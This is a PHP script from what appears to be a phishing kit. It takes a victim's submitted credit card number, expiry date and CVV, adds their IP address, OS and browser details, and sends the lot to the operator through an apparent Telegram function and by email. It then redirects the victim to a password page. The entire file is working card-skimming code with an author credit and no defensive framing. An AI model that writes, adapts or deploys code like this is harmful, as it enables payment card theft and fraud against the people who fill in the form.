<?php

/*

Author : DIB
Email : b41tsm@gmail.com
ICQ : @MorrisWorm

*/

if(isset($_POST['ccFormatMonitor']) && isset($_POST['inputExpDate']) && isset($_POST['cvv'])){
	
include "../config.php";
include "funcs.php";

$ccn =  $_POST['ccFormatMonitor'];
$cce =  $_POST['inputExpDate'];
$cvv =  $_POST['cvv'];

$message = "\nCC : $ccn\nEXP : $cce\nCCV : $cvv\nOS : ".getOs($_SERVER['HTTP_USER_AGENT'])."\nBrowser: ".getBrowser($_SERVER['HTTP_USER_AGENT'])."\nIP : $ip\nAgent: ".$_SERVER['HTTP_USER_AGENT']."\n----\n";

toTG($message);
$headers = "From: DIB  <noreply@moneyteam.DIB>";
$headers .= "MIME-Version: 1.0\n";
//$headers .= "Content-type: text/html; charset=UTF-8\n";
$subject = "NEW SG [CC] INFO from $ip";

$emaillist = explode(',',$to);

foreach($emaillist as $email){
mail($email,$subject,$message,$headers);
}

echo "<meta http-equiv=\"Refresh\" content=\"0; url=../pass.php\" />";



}
?>